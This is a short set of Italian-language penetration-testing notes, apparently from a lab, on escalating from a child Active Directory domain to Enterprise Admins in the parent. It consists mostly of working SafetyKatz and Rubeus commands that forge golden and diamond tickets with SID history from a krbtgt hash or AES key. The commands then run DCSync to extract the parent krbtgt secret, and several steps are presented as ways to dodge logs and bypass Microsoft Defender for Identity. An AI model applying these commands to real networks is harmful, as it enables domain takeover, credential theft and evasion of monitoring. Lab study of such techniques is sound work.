# Priv Esc - Enterprise Admins - Child to Parent krbtgt hash

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

* Questo e' piu' semplice, basta semplicemente forgiare un Golden Ticket ( non un inter-realm TGT) con sIDHistory del gruppo Enterprise Admins

#### SafetyKatz.exe

* Per via del trust, il domain parent (padre) trustera' il TGT

```powershell
SafetyKatz.exe "kerberos::golden /user:Administrator
/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
719815819-3726368948-3917688648 /sids:S-1-5-21-
335606122-960912869-3279953914-519
/krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

* Evitare log sospetti e bypass MDI utilizzando l'identita' del DC

```powershell
SafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /id:1000
/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-
3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-
3279953914-516,S-1-5-9
/krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

* Poi DCSync

```powershell
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

* &#x20;S-1-5-21-2578538781-2508153159-3419410681-516 - Domain Controllers
* S-1-5-9 - Enterprise Domain Controllers

#### Rubeus.exe

* Avoid suspicious logs and bypass MDI by using Domain Controller identity\
  (using Rubeus)

```powershell
Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb
5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-
3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-
3279953914-516,S-1-5-9 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt
```

* Poi DCSync

```powershell
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

* Diamond Ticket  con sIDHistory evitera' log sospetti su DC child e parent, inoltre bypassa MDI:

```powershell
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cd
a848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$
/domain:dollarcorp.moneycorp.local /dc:dcorp-
dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-
335606122-960912869-3279953914-516,S-1-5-9
/createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

* Poi DCSync

```powershell
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```
